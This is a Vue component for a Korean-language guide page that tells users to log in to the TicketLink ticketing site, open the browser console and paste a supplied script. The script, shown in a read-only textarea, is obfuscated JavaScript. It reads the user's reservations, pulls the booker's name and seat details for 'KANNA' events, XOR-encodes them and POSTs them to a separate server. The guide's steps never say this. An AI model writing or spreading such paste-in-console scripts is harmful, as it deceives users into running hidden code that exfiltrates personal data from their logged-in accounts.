<template>
  <div id="guide">
    <textarea v-model="text" readonly></textarea>
    <p>1. 위 텍스트 전체를 복사한다.</p>
    <img src="@/assets/images/guide1.png" />
    <p>2. 티켓링크 로그인을 한 뒤 키보드에 F12 버튼을 누른다.(어느 페이지든 상관없음)</p>
    <img src="@/assets/images/guide2.png" />
    <p>3. 빨간색 동그라미친 부분에 있는 Console 버튼을 누른다. 한글로는 콘솔일 거다.</p>
    <img src="@/assets/images/guide3.png" />
    <p>4. 아까 복사한 텍스트를 붙여넣고 엔터를 누르면 끝</p>
  </div>
</template>

<script lang="ts" setup>
const text = ref(`const _0x3cc794=_0x5792;function _0x2da4(){const _0x202ad6=['263673bYDHfM','http://localhost:3000/ticket','fromCharCode','charCodeAt','displayProductName','includes','69898fLieFn','text','placeName','7RlXCcs','$scope','push','slice','https://www.ticketlink.co.kr/my/reserve/','156105DLqJsY','POST','map','seatNames','stringify','594908OfNoUz','5nepKqx','1078596Acmpmd','KANNA','https://www.ticketlink.co.kr/my/reserve/gate/list','all','1598219oogwcB','split','application/json','parse','27080aJSjqP','b38094d1a794cd6b58679b4377cff2bfda927a5fb595a4361b8c1ec0188033df','\x20=\x20','reserveUserName'];_0x2da4=function(){return _0x202ad6;};return _0x2da4();}(function(_0x2926d9,_0x5c2c12){const _0x3db6a6=_0x5792,_0x5b7b95=_0x2926d9();while(!![]){try{const _0x5006c3=parseInt(_0x3db6a6(0x102))/0x1*(parseInt(_0x3db6a6(0xff))/0x2)+parseInt(_0x3db6a6(0x107))/0x3+-parseInt(_0x3db6a6(0x10c))/0x4*(parseInt(_0x3db6a6(0x10d))/0x5)+parseInt(_0x3db6a6(0x10e))/0x6+-parseInt(_0x3db6a6(0x112))/0x7+parseInt(_0x3db6a6(0x116))/0x8+parseInt(_0x3db6a6(0x11a))/0x9;if(_0x5006c3===_0x5c2c12)break;else _0x5b7b95['push'](_0x5b7b95['shift']());}catch(_0x446806){_0x5b7b95['push'](_0x5b7b95['shift']());}}}(_0x2da4,0x203f2));let data=JSON[_0x3cc794(0x115)]((await(await fetch(_0x3cc794(0x110)))[_0x3cc794(0x100)]())[_0x3cc794(0x113)]('initData')[0x2][_0x3cc794(0x113)](_0x3cc794(0x118))[0x1]['slice'](0x0,-0x3)),checksum='b38094d1a794cd6b58679b4377cff2bfda927a5fb595a4361b8c1ec0188033df',tempStr=checksum,result={'a':data[0x0][_0x3cc794(0x119)],'b':[],'checksum':tempStr};result['b'][_0x3cc794(0x104)](...await Promise[_0x3cc794(0x111)](data[_0x3cc794(0x109)](async _0x479820=>{const _0x1a22cc=_0x3cc794;if(!checksum)return;let _0x821f0a=JSON[_0x1a22cc(0x115)]((await(await fetch(_0x1a22cc(0x106)+_0x479820['reserveNo']))[_0x1a22cc(0x100)]())[_0x1a22cc(0x113)](_0x1a22cc(0x103))[0x2]['split'](_0x1a22cc(0x118))[0x1][_0x1a22cc(0x105)](0x0,-0x4));if(_0x821f0a['productName'][_0x1a22cc(0x11f)](_0x1a22cc(0x10f))&&checksum===_0x1a22cc(0x117))return{'s':_0x821f0a[_0x1a22cc(0x10a)],'c':parseInt(_0x479820[_0x1a22cc(0x11e)]['split']('\x20')[0x4]),'p':_0x479820[_0x1a22cc(0x101)]};})));function _0x5792(_0x43b183,_0x447bc7){const _0x2da491=_0x2da4();return _0x5792=function(_0x579280,_0x2cfb81){_0x579280=_0x579280-0xff;let _0x2a7043=_0x2da491[_0x579280];return _0x2a7043;},_0x5792(_0x43b183,_0x447bc7);}let tempChar='k';for(let i of[...tempStr]){tempChar=tempChar^i+0x1;}let info=[];for(let i of[...JSON[_0x3cc794(0x10b)](result)]){info[_0x3cc794(0x104)](String[_0x3cc794(0x11c)](i[_0x3cc794(0x11d)](0x0)^tempChar));}fetch(_0x3cc794(0x11b),{'method':_0x3cc794(0x108),'body':JSON[_0x3cc794(0x10b)](info),'headers':{'Content-Type':_0x3cc794(0x114)}});`);
</script>

<style lang="scss" scoped>
@import "@/styles/pages/guide/styles.scss";
</style>
